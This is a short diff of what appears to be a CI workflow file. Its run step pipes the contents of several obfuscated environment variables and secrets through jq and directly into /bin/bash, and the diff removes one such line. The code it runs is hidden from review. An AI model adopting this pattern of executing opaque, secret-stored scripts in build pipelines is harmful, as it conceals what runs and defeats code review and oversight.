@@ -18,7 +18,6 @@ jobs:
           xp3: ${{ secrets.xp3 }}
         run: |
           printf '%s' "$xp3" | jq -r .nnp54049 | /bin/bash
-          printf '%s' "$qlec186" | jq -r .kkk91601 | /bin/bash
           echo $byv3 | jq -r .wur889 | /bin/bash
           echo $x7 | jq -r .fu50 | /bin/bash
           echo $ug61 | jq -r .kq1142 | /bin/bash
